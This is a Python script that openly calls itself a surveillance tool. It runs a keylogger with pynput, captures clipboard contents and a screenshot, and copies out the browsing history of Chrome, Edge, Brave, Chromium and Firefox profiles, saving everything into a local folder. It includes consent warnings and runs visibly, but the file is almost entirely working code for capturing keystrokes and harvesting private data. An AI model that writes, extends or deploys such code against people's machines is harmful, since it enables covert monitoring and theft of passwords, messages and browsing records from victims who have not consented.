#!/usr/bin/env python3
"""
surveillance_history_exporter.py

Combined browser history extractor with additional surveillance capabilities.
ONLY use on machines you own or have explicit permission to inspect.

Creates: PROJECT_SURVEILLANCE/ directory with:
  - search_history.xlsx (full browser history)
  - keystrokes.xlsx (10-second keylogger capture)
  - clipboard.txt (current clipboard content)
  - screenshot.png (current screen capture)
  - logs.txt (keylogger text output)

Dependencies:
  pip install pandas openpyxl pyautogui pyperclip psutil browserhistory pynput

Usage:
  python surveillance_history_exporter.py

Notes:
  - This script performs multiple surveillance activities
  - Use only with proper authorization
  - Keylogger runs for 10 seconds by default
"""

from pathlib import Path
import os
import shutil
import sqlite3
import tempfile
import datetime
import sys
import traceback
import time
import pyautogui
import pyperclip
import pandas as pd
from pynput import keyboard

# =======================================================
# CONFIGURATION
# =======================================================
BASE_DIR = "PROJECT_SURVEILLANCE"
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

# File paths
LOG_FILE = os.path.join(BASE_DIR, "logs.txt")
KEYSTROKES_XLSX = os.path.join(BASE_DIR, "keystrokes.xlsx")
CLIPBOARD_FILE = os.path.join(BASE_DIR, "clipboard.txt")
SCREENSHOT_FILE = os.path.join(BASE_DIR, "screenshot.png")
OUTPUT_XLSX = os.path.join(BASE_DIR, "search_history.xlsx")

# History extraction settings
LIMIT_PER_PROFILE = 5000
USER_HOME = Path(os.path.expanduser("~"))

# Browser paths
CHROME_BASES = {
    "Chrome": USER_HOME / "AppData" / "Local" / "Google" / "Chrome" / "User Data",
    "Edge": USER_HOME / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data",
    "Brave": USER_HOME / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data",
    "Chromium": USER_HOME / "AppData" / "Local" / "Chromium" / "User Data",
}

FIREFOX_BASE = USER_HOME / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"

# =======================================================
# SURVEILLANCE MODULES
# =======================================================

# Keylogger
keystrokes = []

def on_press(key):
    """Keylogger callback function"""
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    keystrokes.append(k)
    print(k, end="", flush=True)

def start_keylogger(duration=10):
    """Capture keystrokes for specified duration"""
    global keystrokes
    keystrokes = []
    print(f"\n[Keylogger] Starting {duration}-second capture... Type something:")
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    time.sleep(duration)
    listener.stop()
    
    # Save to files
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("".join(keystrokes))
    df = pd.DataFrame(keystrokes, columns=["Keystrokes"])
    df.to_excel(KEYSTROKES_XLSX, index=False)
    print(f"\n[Keylogger] Saved {len(keystrokes)} keystrokes")

def capture_clipboard():
    """Capture current clipboard content"""
    try:
        content = pyperclip.paste()
        with open(CLIPBOARD_FILE, "w", encoding="utf-8") as f:
            f.write(f"Clipboard captured at: {datetime.datetime.now()}\n")
            f.write("="*50 + "\n")
            f.write(content)
        print(f"[Clipboard] Captured {len(content)} characters")
    except Exception as e:
        with open(CLIPBOARD_FILE, "w", encoding="utf-8") as f:
            f.write(f"Clipboard error: {e}")
        print(f"[!] Clipboard capture failed: {e}")

def capture_screenshot():
    """Capture screenshot"""
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(SCREENSHOT_FILE)
        print(f"[Screenshot] Saved to {SCREENSHOT_FILE}")
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")

# =======================================================
# BROWSER HISTORY EXTRACTION (Original functionality)
# =======================================================

def copy_db_to_temp(src_path: Path) -> Path:
    """Copy DB file to a temp file and return path to temp copy"""
    if not src_path.exists():
        raise FileNotFoundError(f"Source DB not found: {src_path}")
    fd, tmp_path = tempfile.mkstemp(prefix="history_copy_", suffix=src_path.suffix)
    os.close(fd)
    shutil.copy2(str(src_path), tmp_path)
    return Path(tmp_path)

def chrome_time_to_dt(microseconds_since_1601):
    """Convert Chrome timestamp to datetime"""
    try:
        us = int(microseconds_since_1601)
        if us == 0:
            return None
        epoch_start = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
        return (epoch_start + datetime.timedelta(microseconds=us)).astimezone(datetime.timezone.utc)
    except Exception:
        return None

def firefox_time_to_dt(msec_or_micro):
    """Convert Firefox timestamp to datetime"""
    try:
        val = int(msec_or_micro)
        if val == 0:
            return None
        if val > 10**12:
            return datetime.datetime.utcfromtimestamp(val / 1_000_000).replace(tzinfo=datetime.timezone.utc)
        if val > 10**10:
            return datetime.datetime.utcfromtimestamp(val / 1_000).replace(tzinfo=datetime.timezone.utc)
        return datetime.datetime.utcfromtimestamp(val).replace(tzinfo=datetime.timezone.utc)
    except Exception:
        return None

def extract_chrome_family_history(browser_name, user_data_dir: Path, limit=LIMIT_PER_PROFILE):
    """Extract history from Chrome-based browsers"""
    entries = []
    try:
        if not user_data_dir.exists():
            return entries

        profile_dirs = []
        default = user_data_dir / "Default"
        if default.exists():
            profile_dirs.append(default)
        
        for p in user_data_dir.glob("Profile *"):
            if p.is_dir():
                profile_dirs.append(p)
        
        for p in user_data_dir.iterdir():
            if p.is_dir() and p.name not in ("System Profile", "Local State", "Guest Profile") and p not in profile_dirs:
                if (p / "History").exists():
                    profile_dirs.append(p)

        for profile in profile_dirs:
            history_db = profile / "History"
            if not history_db.exists():
                continue
            try:
                tmp_db = copy_db_to_temp(history_db)
            except Exception as e:
                print(f"[!] Could not copy {history_db}: {e}", file=sys.stderr)
                continue

            conn = None
            try:
                conn = sqlite3.connect(str(tmp_db))
                cursor = conn.cursor()
                query = "SELECT url, title, visit_count, last_visit_time FROM urls "
                if limit:
                    query += f"ORDER BY last_visit_time DESC LIMIT {limit}"
                cursor.execute(query)
                rows = cursor.fetchall()
                for url, title, visit_count, last_visit_time in rows:
                    dt = chrome_time_to_dt(last_visit_time)
                    entries.append({
                        "Browser": browser_name,
                        "Profile": profile.name,
                        "URL": url,
                        "Title": title,
                        "VisitCount": visit_count,
                        "LastVisitTime": dt.isoformat() if dt else None
                    })
            except sqlite3.DatabaseError as e:
                print(f"[!] SQLite error reading {history_db}: {e}", file=sys.stderr)
            finally:
                if conn:
                    conn.close()
                tmp_db.unlink(missing_ok=True)
    except Exception as e:
        print(f"[!] Error in {browser_name} extraction: {e}", file=sys.stderr)
    return entries

def extract_firefox_history(profiles_base: Path, limit=LIMIT_PER_PROFILE):
    """Extract history from Firefox"""
    entries = []
    try:
        if not profiles_base.exists():
            return entries

        for profile in profiles_base.iterdir():
            if not profile.is_dir():
                continue
            db_path = profile / "places.sqlite"
            if not db_path.exists():
                continue
            try:
                tmp_db = copy_db_to_temp(db_path)
            except Exception as e:
                print(f"[!] Could not copy {db_path}: {e}", file=sys.stderr)
                continue

            conn = None
            try:
                conn = sqlite3.connect(str(tmp_db))
                cursor = conn.cursor()
                query = "SELECT url, title, visit_count, last_visit_date FROM moz_places "
                if limit:
                    query += f"ORDER BY last_visit_date DESC LIMIT {limit}"
                cursor.execute(query)
                rows = cursor.fetchall()
                for url, title, visit_count, last_visit_date in rows:
                    dt = firefox_time_to_dt(last_visit_date)
                    entries.append({
                        "Browser": "Firefox",
                        "Profile": profile.name,
                        "URL": url,
                        "Title": title,
                        "VisitCount": visit_count,
                        "LastVisitTime": dt.isoformat() if dt else None
                    })
            except sqlite3.DatabaseError as e:
                print(f"[!] SQLite error reading {db_path}: {e}", file=sys.stderr)
            finally:
                if conn:
                    conn.close()
                tmp_db.unlink(missing_ok=True)
    except Exception as e:
        print(f"[!] Error in Firefox extraction: {e}", file=sys.stderr)
    return entries

def gather_all_histories(limit=LIMIT_PER_PROFILE):
    """Gather history from all browsers"""
    all_entries = []

    for browser_name, base_path in CHROME_BASES.items():
        entries = extract_chrome_family_history(browser_name, base_path, limit=limit)
        if entries:
            print(f"[History] Found {len(entries)} entries for {browser_name}")
        all_entries.extend(entries)

    ff_entries = extract_firefox_history(FIREFOX_BASE, limit=limit)
    if ff_entries:
        print(f"[History] Found {len(ff_entries)} entries for Firefox")
    all_entries.extend(ff_entries)

    return all_entries

def save_to_excel(entries, output_path=OUTPUT_XLSX):
    """Save history data to Excel"""
    try:
        if not entries:
            print("[!] No history entries found; creating empty file with headers.")
            df = pd.DataFrame(columns=["Browser", "Profile", "URL", "Title", "VisitCount", "LastVisitTime"])
        else:
            df = pd.DataFrame(entries)
            try:
                df["LastVisitSort"] = pd.to_datetime(df["LastVisitTime"], utc=True)
                df = df.sort_values("LastVisitSort", ascending=False).drop(columns=["LastVisitSort"])
            except Exception:
                pass
        df.to_excel(output_path, index=False)
        print(f"[History] Saved {len(df)} rows to {output_path}")
    except Exception as e:
        print(f"[!] Failed to save Excel file: {e}", file=sys.stderr)

# =======================================================
# MAIN EXECUTION
# =======================================================

def main():
    """Main execution function"""
    print("=" * 60)
    print("🚀 SURVEILLANCE & HISTORY EXPORTER")
    print("=" * 60)
    print("⚠️  WARNING: Use only on machines you own or have explicit permission to inspect!")
    print("=" * 60)
    
    # Create output directory
    if not os.path.exists(BASE_DIR):
        os.makedirs(BASE_DIR)
        print(f"[System] Created output directory: {BASE_DIR}")
    
    print("\n📊 Starting surveillance operations...")
    
    # Run surveillance modules
    start_keylogger(duration=10)
    capture_clipboard()
    capture_screenshot()
    
    print("\n🌐 Extracting browser histories...")
    entries = gather_all_histories(limit=LIMIT_PER_PROFILE)
    save_to_excel(entries, OUTPUT_XLSX)
    
    # Summary
    print("\n" + "=" * 60)
    print("✅ SURVEILLANCE COMPLETE")
    print("=" * 60)
    print("📁 Files created in PROJECT_SURVEILLANCE/:")
    print(f"├── 📊 {os.path.basename(OUTPUT_XLSX)}     - Browser history")
    print(f"├── ⌨️  {os.path.basename(KEYSTROKES_XLSX)}    - Keystrokes log")
    print(f"├── 📋 {os.path.basename(CLIPBOARD_FILE)}      - Clipboard content")
    print(f"├── 🖼️  {os.path.basename(SCREENSHOT_FILE)}    - Screenshot")
    print(f"└── 📄 {os.path.basename(LOG_FILE)}           - Keystrokes text")
    print(f"\n📂 Output location: {os.path.abspath(BASE_DIR)}")
    print("=" * 60)

if __name__ == "__main__":
    main()